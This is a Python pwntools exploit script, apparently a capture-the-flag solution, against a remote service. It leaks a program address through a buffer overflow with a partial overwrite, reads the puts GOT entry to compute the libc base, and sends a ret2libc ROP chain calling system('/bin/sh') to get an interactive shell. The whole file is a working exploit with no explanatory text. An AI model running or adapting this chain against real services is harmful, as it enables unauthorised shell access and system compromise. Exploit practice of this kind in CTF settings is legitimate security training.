from pwn import *


r = remote("exp.zip", 56013)


puts_got_rel=0x2c2b
puts_libc_off=0x80ed0
sys_libc_off = 0x50d60
bin_libc_off = 0x1d8698
poprdi = 0x2a3e5
ret_off = 0x36b

r.recvuntil(b"choice:")
r.sendline(b'aaaaaaa')
r.recvuntil(b"me :")
payload = b"a"*296
payload += b'\x85'
r.send(payload)

main_addr=r.recvline()[296:].rstrip(b'\n')

main_addr=int.from_bytes(main_addr, byteorder='little')



r.recvuntil(b"choice:")
r.send(b'yes')
r.recvuntil(b"(in hex) :")

puts_got_off =  main_addr + puts_got_rel
puts_got_off = bytes(format(puts_got_off,'x'), 'utf-8')



r.sendline(puts_got_off)

r.recvuntil(b"address : ")

puts_addr = r.recvline().rstrip(b'\n')


base_addr = int(puts_addr,16) - puts_libc_off

poprdi_addr = base_addr + poprdi
sys_addr = base_addr + sys_libc_off
bin_addr = base_addr + bin_libc_off

ret_addr = main_addr - ret_off

payload = b"a"*296  + p64(poprdi_addr) + p64(bin_addr) + p64(ret_addr) + p64(sys_addr)

r.recvuntil(b"me :")

r.send(payload)

r.interactive()




